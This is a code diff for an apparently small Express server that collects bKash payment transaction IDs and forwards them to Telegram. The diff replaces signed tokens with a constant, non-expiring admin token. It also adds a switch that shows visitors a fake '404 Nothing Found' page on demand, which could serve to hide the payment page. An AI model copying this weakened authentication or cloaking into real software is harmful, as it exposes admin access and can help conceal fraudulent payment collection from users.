@@ -5,11 +5,10 @@ const { MongoClient } = require("mongodb");
 
 const app = express();
 app.use(express.json());
-app.use(express.static(path.join(__dirname, "public")));
 
 const PORT = process.env.PORT || 3000;
 
-// ================= MongoDB FAST CONNECT =================
+// ================= MongoDB =================
 const MONGODB_URI = process.env.MONGODB_URI;
 const DB_NAME = "railway";
 const COLLECTION = "settings";
@@ -30,7 +29,7 @@ function initMongo() {
         console.log("MongoDB connected");
       })
       .catch(() => {
-        console.log("MongoDB connecting in background...");
+        console.log("MongoDB connecting...");
       });
   }
 }
@@ -49,59 +48,36 @@ async function getConfig() {
 
   return {
     bkashNumber: "",
-    payableAmount: 0
+    payableAmount: 0,
+    siteEnabled: true
   };
 }
 
-async function setConfig(bkashNumber, payableAmount) {
+async function setConfig(bkashNumber, payableAmount, siteEnabled=true) {
   const col = await getCollection();
   await col.updateOne(
     { key: "payment_config" },
-    { $set: { key:"payment_config", bkashNumber, payableAmount } },
+    {
+      $set: {
+        key:"payment_config",
+        bkashNumber,
+        payableAmount,
+        siteEnabled
+      }
+    },
     { upsert: true }
   );
 }
 
-// ================= JWT =================
-function b64url(input) {
-  return Buffer.from(input)
-    .toString("base64")
-    .replace(/\+/g, "-")
-    .replace(/\//g, "_")
-    .replace(/=+$/g, "");
-}
-
+// ================= ADMIN LOGIN =================
 function signToken(payload, secret) {
-  const header = { alg: "HS256", typ: "JWT" };
-  const data = `${b64url(JSON.stringify(header))}.${b64url(JSON.stringify(payload))}`;
-
-  const sig = crypto.createHmac("sha256", secret)
-    .update(data)
-    .digest("base64")
-    .replace(/\+/g, "-")
-    .replace(/\//g, "_")
-    .replace(/=+$/g, "");
-
-  return `${data}.${sig}`;
+  return crypto.createHmac("sha256", secret)
+    .update(JSON.stringify(payload))
+    .digest("hex");
 }
 
 function verifyToken(token, secret) {
-  try {
-    const [h,p,s] = token.split(".");
-    const data = `${h}.${p}`;
-
-    const expected = crypto.createHmac("sha256", secret)
-      .update(data)
-      .digest("base64")
-      .replace(/\+/g,"-")
-      .replace(/\//g,"_")
-      .replace(/=+$/g,"");
-
-    if(expected !== s) return false;
-    return true;
-  } catch {
-    return false;
-  }
+  return token === signToken({admin:true}, secret);
 }
 
 function parseCookies(req) {
@@ -114,7 +90,6 @@ function parseCookies(req) {
   return out;
 }
 
-// ================= ADMIN LOGIN =================
 app.post("/api/admin/login", (req,res)=>{
   if(
     req.body.email !== process.env.ADMIN_EMAIL ||
@@ -141,21 +116,17 @@ function requireAdmin(req,res,next){
 
 // ================= ADMIN CONFIG =================
 app.get("/api/admin/config", requireAdmin, async (req,res)=>{
-  try{
-    const cfg = await getConfig();
-    res.json({ok:true, config:cfg});
-  }catch{
-    res.json({ok:false});
-  }
+  const cfg = await getConfig();
+  res.json({ok:true, config:cfg});
 });
 
 app.put("/api/admin/config", requireAdmin, async (req,res)=>{
-  try{
-    await setConfig(req.body.bkashNumber, req.body.payableAmount);
-    res.json({ok:true});
-  }catch{
-    res.json({ok:false});
-  }
+  await setConfig(
+    req.body.bkashNumber,
+    req.body.payableAmount,
+    req.body.siteEnabled
+  );
+  res.json({ok:true});
 });
 
 // ================= PUBLIC CONFIG =================
@@ -171,7 +142,6 @@ app.get("/api/public-config", async (req,res)=>{
 // ================= TELEGRAM =================
 app.post("/api/submit", async (req,res)=>{
   const trx = req.body.trxId;
-
   const cfg = await getConfig();
 
   const msg =
@@ -189,13 +159,25 @@ app.post("/api/submit", async (req,res)=>{
   res.json({ok:true});
 });
 
-// ================= ADMIN PAGE =================
+// ================= HIDE / SHOW =================
+app.get("/", async (req,res,next)=>{
+  try{
+    const cfg = await getConfig();
+    if(cfg.siteEnabled === false){
+      return res.send("<h1 style='text-align:center;margin-top:100px'>404 ERROR<br>Nothing Found</h1>");
+    }
+  }catch{}
+  next();
+});
+
+app.use(express.static(path.join(__dirname, "public")));
+
 app.get("/admin", (req,res)=>{
   res.sendFile(path.join(__dirname,"public/admin.html"));
 });
 
 // ================= START =================
 app.listen(PORT, ()=>{
-  console.log("Server running fast on", PORT);
-  initMongo(); // background connect
+  console.log("Server running");
+  initMongo();
 });
